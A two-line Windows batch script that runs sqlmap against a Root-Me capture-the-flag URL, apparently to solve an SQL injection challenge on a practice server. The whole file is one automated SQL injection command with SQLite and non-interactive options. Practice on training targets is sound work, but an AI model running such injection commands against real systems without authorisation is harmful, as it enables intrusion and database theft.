@echo off

python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=2" --dbms=SQLite --batch

